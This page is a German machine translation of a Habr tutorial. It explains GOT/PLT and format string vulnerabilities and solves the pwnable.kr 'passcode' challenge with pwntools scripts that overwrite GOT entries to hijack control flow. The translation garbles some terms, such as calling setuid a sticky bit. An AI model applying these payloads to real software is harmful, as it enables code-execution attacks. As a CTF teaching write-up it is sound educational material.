<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>↩️ 👶🏿 👩🏾‍🤝‍👨🏻 Lösen eines Jobs mit pwnable.kr 05 - Passcode. Schreiben Sie die Prozedur-Link-Tabelle über die Sicherheitsanfälligkeit bezüglich Formatzeichenfolgen neu 🚸 🕴🏿 👨‍✈️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Artikel werden wir analysieren: Was ist die globale Tabelle der Offsets, die Tabelle der Beziehungen von Prozeduren und deren Umschreiben du...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Lösen eines Jobs mit pwnable.kr 05 - Passcode. Schreiben Sie die Prozedur-Link-Tabelle über die Sicherheitsanfälligkeit bezüglich Formatzeichenfolgen neu</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/460647/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="Bild"></div><br>  In diesem Artikel werden wir analysieren: Was ist die globale Tabelle der Offsets, die Tabelle der Beziehungen von Prozeduren und deren Umschreiben durch die Sicherheitsanfälligkeit bezüglich Formatzeichenfolgen?  Wir werden auch die 5. Aufgabe von der Seite <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">pwnable.kr lösen</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Organisationsinformationen</b> <div class="spoiler_text">  Speziell für diejenigen, die etwas Neues lernen und sich in einem der Bereiche Informations- und Computersicherheit entwickeln möchten, werde ich über die folgenden Kategorien schreiben und sprechen: <br><br><ul><li>  PWN; </li><li>  Kryptographie (Krypto); </li><li>  Netzwerktechnologien (Netzwerk); </li><li>  Reverse (Reverse Engineering); </li><li>  Steganographie (Stegano); </li><li>  Suche und Ausnutzung von WEB-Schwachstellen. </li></ul><br>  Darüber hinaus werde ich meine Erfahrungen in den Bereichen Computerforensik, Analyse von Malware und Firmware, Angriffe auf drahtlose Netzwerke und lokale Netzwerke, Durchführung von Pentests und Schreiben von Exploits teilen. <br><a name="habracut"></a><br>  Damit Sie sich über neue Artikel, Software und andere Informationen informieren können, habe ich <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">in Telegram</a> einen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Kanal</a> und eine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gruppe eingerichtet, um alle Probleme</a> im Bereich ICD <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">zu diskutieren</a> .  Außerdem werde ich Ihre persönlichen Anfragen, Fragen, Vorschläge und Empfehlungen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">persönlich</a> prüfen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">und alle beantworten</a> . <br><cut></cut><br>  Alle Informationen werden nur zu Bildungszwecken bereitgestellt.  Der Autor dieses Dokuments übernimmt keine Verantwortung für Schäden, die jemandem durch die Verwendung von Kenntnissen und Methoden entstehen, die durch das Studium dieses Dokuments erworben wurden. <br></div></div><br><h2>  Globale Offset-Tabelle und Prozedur-Beziehungstabelle </h2><br>  Dynamisch verknüpfte Bibliotheken werden zur Startzeit oder zur Laufzeit aus einer separaten Datei in den Speicher geladen.  Daher sind ihre Adressen im Speicher nicht festgelegt, um Speicherkonflikte mit anderen Bibliotheken zu vermeiden.  Darüber hinaus randomisiert der ASLR-Sicherheitsmechanismus die Adresse jedes Moduls beim Start. <br><br>  Global Offset Table (GOT) - Eine Tabelle mit Adressen, die im Datenabschnitt gespeichert sind.  Es wird zur Laufzeit verwendet, um nach Adressen globaler Variablen zu suchen, die zur Kompilierungszeit unbekannt waren.  Diese Tabelle befindet sich im Datenabschnitt und wird nicht von allen Prozessen verwendet.  Alle absoluten Adressen, auf die im Codeabschnitt verwiesen wird, werden in dieser GOT-Tabelle gespeichert.  Der Codeabschnitt verwendet relative Offsets, um auf diese absoluten Adressen zuzugreifen.  Somit kann der Bibliothekscode von Prozessen gemeinsam genutzt werden, selbst wenn sie in verschiedene Speicheradressräume geladen werden. <br><br>  Die Prozedurverknüpfungstabelle (PLT) enthält den Sprungcode zum Aufrufen allgemeiner Funktionen, deren Adressen in der GOT gespeichert sind, d. H. Die PLT enthält die Adressen, an die die Adressen für Daten (Adressen) aus der GOT gespeichert sind. <br><br>  Betrachten Sie den Mechanismus anhand eines Beispiels: <br><br><ol><li>  Im Programmcode wird die externe Funktion printf aufgerufen. </li><li>  Der Kontrollfluss geht zum n-ten Datensatz in der PLT, und der Übergang erfolgt mit einem relativen Versatz anstelle einer absoluten Adresse. </li><li>  Geht zu der im GOT gespeicherten Adresse.  Der in der GOT-Tabelle gespeicherte Funktionszeiger zeigt zuerst auf das PLT-Code-Snippet zurück. </li><li>  Wenn also printf zum ersten Mal aufgerufen wird, wird der dynamische Linker-Konverter aufgerufen, um die tatsächliche Adresse der Zielfunktion zu erhalten. </li><li>  Die printf-Adresse wird in die GOT-Tabelle geschrieben, und dann wird printf aufgerufen. </li><li>  Wenn printf im Code erneut aufgerufen wird, wird der Resolver nicht mehr aufgerufen, da die Adresse von printf bereits in GOT gespeichert ist. </li></ol><cut></cut><br><img src="https://habrastorage.org/webt/j4/yh/xf/j4yhxfc-twcuo9m9e5o2nanwoug.png" alt="Bild"><br><br>  Bei Verwendung dieser verzögerten Bindung sind Zeiger auf Funktionen, die zur Laufzeit nicht verwendet werden, nicht zulässig.  Das spart viel Zeit. <br><br>  Damit dieser Mechanismus funktioniert, sind die folgenden Abschnitte in der Datei vorhanden: <br><br><ul><li>  .got - enthält Einträge für GOT; </li><li>  .lt - enthält Einträge für PLT; </li><li>  .got.plt - enthält die Adressbeziehungen GOT - PLT; </li><li>  .plt.got - enthält die Adressbeziehungen PLT - GOT. </li></ul><br>  Da der Abschnitt .got.plt ein Array von Zeigern ist und während der Programmausführung gefüllt wird (d. H. Das Schreiben ist darin zulässig), können wir einen von ihnen überschreiben und den Programmausführungsfluss steuern. <br><br><h2>  Zeichenfolge formatieren </h2><br>  Eine Formatzeichenfolge ist eine Zeichenfolge, die Formatspezifizierer verwendet.  Der Formatbezeichner wird durch das Symbol "%" angezeigt (um das Prozentzeichen einzugeben, verwenden Sie die Sequenz "%%"). <br><br><pre><code class="cpp hljs">pritntf(“output %s <span class="hljs-number"><span class="hljs-number">123</span></span>”, “str”); output str <span class="hljs-number"><span class="hljs-number">123</span></span></code> </pre> <br>  Die wichtigsten Formatspezifizierer: <br><br><ul><li>  d - dezimale vorzeichenbehaftete Zahl, Standardgröße, sizeof (int); </li><li>  x und X sind eine vorzeichenlose Hexadezimalzahl, x verwendet Kleinbuchstaben (abcdef), X Großbuchstaben (ABCDEF), die Standardgröße ist sizeof (int); </li><li>  s - Zeilenausgang mit Null-Abschlussbyte; </li><li>  n ist die Anzahl der Zeichen, die zum Zeitpunkt des Auftretens der Befehlssequenz mit n geschrieben wurden. </li></ul><br><h2>  Warum ist eine Sicherheitsanfälligkeit bezüglich Formatzeichenfolgen möglich? </h2><br>  Diese Sicherheitsanfälligkeit besteht darin, eine der Formatausgabefunktionen zu verwenden, ohne ein Format anzugeben (wie im folgenden Beispiel).  Somit können wir selbst das Ausgabeformat angeben, das dazu führt, dass Werte aus dem Stapel gelesen und bei Angabe eines speziellen Formats in den Speicher geschrieben werden können. <br><cut></cut><br>  Betrachten Sie die Sicherheitsanfälligkeit im folgenden Beispiel: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main(){ char input[100]; printf("Start program!!!\n"); printf("Input: "); scanf("%s", &amp;input); printf("\nYour input: "); printf(input); printf("\n"); exit(0); }</span></span></span></span></code> </pre> <br>  Daher gibt die nächste Zeile nicht das Ausgabeformat an. <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(input);</code> </pre> <br>  Kompilieren Sie das Programm. <br><br><pre> <code class="bash hljs">gcc vuln1.c -o vuln -no-pie</code> </pre> <br>  Schauen wir uns die Werte auf dem Stapel an, indem wir eine Zeile mit Formatbezeichnern eingeben. <br><br><img src="https://habrastorage.org/webt/i9/ib/es/i9ibeshbd2zhx5zmza0gxoegc-e.png" alt="Bild"><br><br>  Beim Aufrufen von printf (Eingabe) wird daher der folgende Aufruf ausgelöst: <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(“%p-%p-%p-%p-%p“);</code> </pre> <br>  Es bleibt zu verstehen, was das Programm anzeigt.  Die Funktion printf verfügt über mehrere Argumente, bei denen es sich um Daten für eine Formatzeichenfolge handelt. <br><br>  Betrachten Sie ein Beispiel für einen Funktionsaufruf mit den folgenden Argumenten: <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(“Number - %d, addres - %<span class="hljs-number"><span class="hljs-number">08</span></span>x, <span class="hljs-built_in"><span class="hljs-built_in">string</span></span> - %s”, a, &amp;b, c);</code> </pre> <br>  Wenn diese Funktion aufgerufen wird, sieht der Stapel wie folgt aus. <br><br><img src="https://habrastorage.org/webt/vo/rj/n2/vorjn2194dvix4kr4mmzutja890.png" alt="Bild"><br><br>  Wenn also ein Formatbezeichner erkannt wird, ruft die Funktion den Wert des Stapels ab.  In ähnlicher Weise ruft eine Funktion aus unserem Beispiel 5 Werte vom Stapel ab. <br><br><img src="https://habrastorage.org/webt/uj/_j/vc/uj_jvcokc0m81teugsjel-ovzsk.png" alt="Bild"><br><br>  Um dies zu bestätigen, finden wir unsere Formatzeichenfolge im Stapel. <br><br><img src="https://habrastorage.org/webt/tm/og/pm/tmogpmxoiospc4wwcybi3daw-3u.png" alt="Bild"><br><br>  Bei der Übersetzung von Werten aus einer Hex-Ansicht erhalten wir die Zeichenfolge „% -p% AAAA“.  Das heißt, wir konnten die Werte vom Stapel abrufen. <br><br><h2>  GOT Overwrite </h2><br>  Lassen Sie uns die Fähigkeit überprüfen, GOT durch die Sicherheitsanfälligkeit bezüglich Formatzeichenfolgen neu zu schreiben.  Dazu schleifen wir unser Programm, indem wir die Adresse der Funktion exit () in die Adresse main umschreiben.  Wir werden mit pwntools überschreiben.  Erstellen Sie das ursprüngliche Layout und wiederholen Sie den vorherigen Eintrag. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * ex = process(<span class="hljs-string"><span class="hljs-string">'./vuln'</span></span>) payload = <span class="hljs-string"><span class="hljs-string">"AAAA%p-%p-%p-%p-%p-%p-%p-%p"</span></span> ex.sendline(payload) ex.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/ln/ej/lh/lnejlh85r86iny9le7wepst28mo.png" alt="Bild"><br><br>  Da der Inhalt des Stapels jedoch abhängig von der Größe der eingegebenen Zeichenfolge unterschiedlich ist, stellen wir sicher, dass die Eingabeladung immer die gleiche Anzahl eingegebener Zeichen enthält. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p"</span></span>*<span class="hljs-number"><span class="hljs-number">5</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, ”*”)</code> </pre> <br><img src="https://habrastorage.org/webt/h8/sg/wg/h8sgwghgqjftpqreusafipcpz0s.png" alt="Bild"><br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, ”*”)</code> </pre> <br><img src="https://habrastorage.org/webt/gj/bw/d-/gjbwd-9aigcck02hc2k9og5nfve.png" alt="Bild"><br><br>  Jetzt müssen wir die GOT-Adresse der exit () -Funktionen und die Adresse der Hauptfunktion herausfinden.  Die Hauptadresse wird mit gdb gefunden. <br><br><img src="https://habrastorage.org/webt/fp/bm/nn/fpbmnn6xs2bquxngua1igncslnm.png" alt="Bild"><br><br>  Die GOT-Adresse von exit () kann sowohl mit gdb als auch mit objdump ermittelt werden. <br><br><img src="https://habrastorage.org/webt/_a/2o/pm/_a2opmke0_snnf_hczyzh0xtl64.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/qj/dj/yp/qjdjypxsia_iz1clauydnmtwdgy.png" alt="Bild"><br><br><pre> <code class="bash hljs">objdump -R vuln</code> </pre> <br><img src="https://habrastorage.org/webt/sf/of/qo/sfofqo2pj9dyvb57yf9hsdc1uw8.png" alt="Bild"><br><br>  Wir werden diese Adressen in unser Programm schreiben. <br><br><pre> <code class="python hljs">main_addr = <span class="hljs-number"><span class="hljs-number">0x401162</span></span> exit_addr = <span class="hljs-number"><span class="hljs-number">0x404038</span></span></code> </pre> <br>  Jetzt müssen Sie die Adresse neu schreiben.  Um dem Stapel die Adresse der exit () -Funktion und die nachfolgenden Adressen hinzuzufügen, d.h.  * (exit ()) + 1 usw.  Sie können es mit unserer Last hinzufügen. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p-"</span></span>*<span class="hljs-number"><span class="hljs-number">5</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr+<span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br>  Führen Sie aus und bestimmen Sie, auf welchem ​​Konto die Adresse angezeigt wird. <br><br><img src="https://habrastorage.org/webt/_f/pg/cj/_fpgcjghcjfywqnhdh8qd1mc1ak.png" alt="Bild"><br><br>  Diese Adressen werden an den Positionen 14 und 15 angezeigt. Sie können den Wert an einer bestimmten Position wie folgt anzeigen. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%14$p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>)</code> </pre> <br><img src="https://habrastorage.org/webt/xl/ss/3u/xlss3uiye9rnbwz9jxmn5skxcry.png" alt="Bild"><br><br>  Wir werden die Adresse in zwei Blöcken umschreiben.  Zunächst drucken wir 4 Werte, sodass sich unsere Adressen an der 2. und 4. Position befinden. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p%14$p%p%15$p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>)</code> </pre> <br><img src="https://habrastorage.org/webt/yw/sy/py/ywsypywco_6skjhhsw1qr40bupc.png" alt="Bild"><br><br>  Jetzt teilen wir die Adresse von main () in zwei Blöcke: <br><blockquote>  0x401162 <br><br>  1) 0x62 = 98 (schreiben bei 0x404038) <br>  2) 0x4011 - 0x62 = 16303 (an die Adresse 0x404039 schreiben) </blockquote><br><br>  Wir schreiben sie wie folgt: <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%98p%14$n%16303p%15$n"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">'*'</span></span>)</code> </pre> <br>  Vollständiger Code: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * start_addr = <span class="hljs-number"><span class="hljs-number">0x401162</span></span> exit_addr = <span class="hljs-number"><span class="hljs-number">0x404038</span></span> ex = process(<span class="hljs-string"><span class="hljs-string">'./vuln'</span></span>) payload = (<span class="hljs-string"><span class="hljs-string">"%98p%14$n%16303p%15$n"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">'*'</span></span>) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr+<span class="hljs-number"><span class="hljs-number">1</span></span>) ex.sendline(payload) ex.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/qi/vg/vr/qivgvrhzkucvpzfs6s-zwftuuhk.png" alt="Bild"><br><br>  Somit wird das Programm neu gestartet, anstatt zu beenden.  Wir haben die exit () -Adresse neu geschrieben. <br><br><h2>  Passcode-Joblösung </h2><br>  Wir klicken auf das erste Symbol mit der Passcode-Signatur und erfahren, dass wir uns über SSH mit dem Passwort Gast verbinden müssen. <br><br><img src="https://habrastorage.org/webt/h2/jc/tj/h2jctjxsee5hardpu6glunfg2fk.png" alt="Bild"><br><br>  Wenn verbunden, sehen wir das entsprechende Banner. <br><br><img src="https://habrastorage.org/webt/-a/me/pp/-ameppolfflavwiv35qbkkgvg-8.png" alt="Bild"><br><br>  Lassen Sie uns herausfinden, welche Dateien sich auf dem Server befinden und welche Rechte wir haben. <br><br><pre> <code class="bash hljs">ls -l</code> </pre> <br><img src="https://habrastorage.org/webt/ds/2m/gv/ds2mgvxu30ah53peas04_wypwja.png" alt="Bild"><br><br>  Auf diese Weise können wir den Quellcode des Programms lesen, da für jeden ein Leserecht besteht, und das Passcode-Programm mit den Rechten des Eigentümers ausführen (das Sticky-Bit ist gesetzt).  Lassen Sie uns das Ergebnis des Codes sehen. <br><br><img src="https://habrastorage.org/webt/ld/mj/wr/ldmjwru5rsabi6jyr9o8rrbt2ps.png" alt="Bild"><br><br>  Es ist ein Fehler in der Funktion login () aufgetreten.  In scanf () wird dem zweiten Argument nicht die Adresse der Variablen &amp; passcode1 übergeben, sondern die Variable selbst, und sie wird nicht initialisiert.  Da die Variable noch nicht initialisiert wurde, enthält sie den ungeschriebenen "Müll", der nach der Ausführung der vorherigen Anweisungen übrig geblieben ist.  Das heißt, scanf () schreibt die Nummer in die Adresse, die die Restdaten sind. <br><br><img src="https://habrastorage.org/webt/vt/5m/w4/vt5mw46djsyiiqhn5h7veqoi8b4.png" alt="Bild"><br><br>  Wenn wir also vor dem Aufrufen der Anmeldefunktion die Kontrolle über diesen Speicherbereich erlangen können, können wir eine beliebige Nummer in eine beliebige Adresse schreiben (tatsächlich die Programmlogik ändern). <br><br>  Da die Funktion login () unmittelbar nach der Funktion welcome () aufgerufen wird, haben sie dieselben Stapelrahmenadressen. <br><br><img src="https://habrastorage.org/webt/tj/zr/yi/tjzryim0sirg0i4t3agtqk4loty.png" alt="Bild"><br><br>  Lassen Sie uns prüfen, ob wir Daten in den zukünftigen Speicherort passcode1 schreiben können.  Öffnen Sie das Programm in gdb und zerlegen Sie die Funktionen login () und welcome ().  Da scanf in beiden Fällen zwei Parameter hat, wird die Adresse der Variablen zuerst an die Funktion übergeben.  Somit lautet die Adresse von Passcode1 ebp-0x10 und der Name ebp-0x70. <br><br><img src="https://habrastorage.org/webt/qv/sj/li/qvsjliyjrjehr1lmvptgi5piju4.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/5t/uy/z3/5tuyz3pptyf76e32xe2idow-rnm.png" alt="Bild"><br><br>  Berechnen wir nun den Adresspasscode1 relativ zum Namen, vorausgesetzt, der ebp-Wert ist der gleiche: <br><blockquote>  (&amp; name) - (&amp; passcode1) = (ebp-0x70) - (ebp-0x10) = -96 <br>  &amp; passcode1 == &amp; name + 96 </blockquote>  Das heißt, die letzten 4 Bytes des Namens - dies ist der "Müll", der als Adresse für das Schreiben in die Anmeldefunktion dient. <br><br>  In diesem Artikel haben wir gesehen, wie Sie die Logik der Anwendung ändern können, indem Sie die Adressen im GOT neu schreiben.  Lass es uns auch hier tun.  Da auf scanf () ein Flush folgt, schreiben wir an die Adresse dieser Funktion in GOT die Adresse des Befehls zum Aufrufen der Funktion system () zum Lesen des Flags. <br><br><img src="https://habrastorage.org/webt/kx/8i/fk/kx8ifk5y4nzodxayzfdr0pyfjaa.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/hh/2l/sx/hh2lsxqchatzgvyhvzi_xqj8-ac.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/nc/vd/bw/ncvdbwjevpugfpt62no2jrnbumk.png" alt="Bild"><br><br>  Das heißt, an der Adresse 0x804a004 müssen Sie 0x80485e3 in Dezimalform schreiben. <br><br><pre> <code class="bash hljs">python -c <span class="hljs-string"><span class="hljs-string">"print('A'*96 + '\x04\xa0\x04\x08' + str(0x080485e3))"</span></span> | ./passcode</code> </pre> <br><img src="https://habrastorage.org/webt/rh/pu/gf/rhpugfjpmu0ykmcgyc_geflsm5s.png" alt="Bild"><br><br>  Als Ergebnis erhalten wir 10 Punkte, bisher ist dies die schwierigste Aufgabe. <br><br><img src="https://habrastorage.org/webt/mg/fm/0-/mgfm0-rba6sb8aehxzm583xrrg4.png" alt="Bild"><br><br>  Dateien für diesen Artikel werden an den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Telegrammkanal</a> angehängt.  Wir sehen uns in den folgenden Artikeln! <br><br>  Wir befinden uns in einem Telegrammkanal: einem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Kanal im Telegramm</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de460647/">https://habr.com/ru/post/de460647/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de460635/index.html">CLRium # 6: Parallelität und Parallelität. Zwei Tage: vom Prozessor zum Async / Warten</a></li>
<li><a href="../de460637/index.html">Lichtsteuerung auf ZigBee</a></li>
<li><a href="../de460641/index.html">YouTokenToMe: Ein Tool zur schnellen Tokenisierung von Text aus dem VKontakte-Team</a></li>
<li><a href="../de460643/index.html">Gleichmäßige Verteilung der Punkte auf einer Kugel</a></li>
<li><a href="../de460645/index.html">Gutes tun, schlechtes tun: Schlechten Code mit Go schreiben, Teil 1</a></li>
<li><a href="../de460651/index.html">Treffen der Society of Anonymous Testers: TMS, Überwachung, Überwachung der Bewertung der Suchqualität und native iOS-Tests</a></li>
<li><a href="../de460655/index.html">Wie ich Telegramm gebrochen habe</a></li>
<li><a href="../de460659/index.html">Verwenden von Rohren zum Schwenken</a></li>
<li><a href="../de460661/index.html">Alles was Sie über Node.js wissen müssen</a></li>
<li><a href="../de460665/index.html">Entwurf einer FAQ: Warum erscheinen alle drei Jahre C ++ - Standards?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>